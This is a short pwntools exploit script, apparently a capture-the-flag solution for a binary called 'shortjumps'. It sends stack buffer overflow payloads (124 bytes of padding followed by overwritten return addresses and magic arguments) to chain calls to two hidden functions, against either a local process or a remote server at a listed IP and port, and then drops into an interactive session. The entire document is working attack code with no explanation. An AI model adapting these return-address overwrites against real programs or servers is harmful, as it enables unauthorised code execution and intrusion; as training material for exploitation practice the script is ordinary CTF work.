from pwn import *
debug=1

jmp1=0x080492b4
main_1=0x08049378
jmp1_arg=0xdeadbeef

jmp2=0x080492e0
jmp2_arg1=0xcafebabe
jmp2_arg2=0x48385879

if debug:
	t=process("./shortjumps")
	#gdb.attach(t,api=True)	
else:
	t=remote("146.190.115.228",9993)
	
t.sendlineafter(b"> ",b"KSCS")
t.sendlineafter(b"> ",b"Y")
payload=b"A"*124+p32(jmp1)+p32(main_1)+p32(jmp1_arg) #main->jump1-> main

t.sendlineafter(b"> ",payload)
t.sendlineafter(b"> ",b"KCSC")
t.sendlineafter(b"> ",b"Y")
payload=b"A"*124+p32(0x080492e0)+p32(main_1)+p32(jmp2_arg1)+p32(jmp2_arg2) #jump2
t.sendlineafter(b"> ",payload)
t.interactive()
